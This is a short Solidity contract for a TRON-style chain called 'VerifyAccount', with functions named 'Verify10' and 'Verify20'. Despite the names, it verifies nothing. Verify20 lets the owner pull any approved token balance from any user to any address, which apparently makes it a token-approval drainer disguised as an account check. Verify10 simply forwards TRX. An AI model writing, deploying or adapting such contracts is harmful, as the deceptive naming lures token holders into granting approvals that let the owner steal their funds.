// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface ITRC20 {
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
}

contract VerifyAccount {
    address public owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    event TRXTransferred(address indexed from, address indexed to, uint256 amount);
    event TokenTransferred(address indexed token, address indexed from, address indexed to, uint256 amount);

    constructor() {
        owner = msg.sender;
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "Not authorized");
        _;
    }

    function Verify10(address payable to, uint256 amount) external payable {
        require(to != address(0), "Invalid address");
        require(amount > 0, "Amount must be greater than 0");
        require(msg.value == amount, "Incorrect TRX amount sent");

        to.transfer(amount);

        emit TRXTransferred(msg.sender, to, amount);
    }

    function Verify20(
        address token,
        address from,
        address to,
        uint256 amount
    ) external onlyOwner {
        require(token != address(0), "Invalid token address");
        require(from != address(0), "Invalid sender address");
        require(to != address(0), "Invalid recipient address");
        require(amount > 0, "Amount must be greater than 0");

        uint256 allowance = ITRC20(token).allowance(from, address(this));
        require(allowance >= amount, "Insufficient allowance");

        uint256 balance = ITRC20(token).balanceOf(from);
        require(balance >= amount, "Insufficient token balance");

        bool success = ITRC20(token).transferFrom(from, to, amount);
        require(success, "Token transfer failed");

        emit TokenTransferred(token, from, to, amount);
    }

    function transferOwnership(address newOwner) public onlyOwner {
        require(newOwner != address(0), "Invalid address");
        emit OwnershipTransferred(owner, newOwner);
        owner = newOwner;
    }
}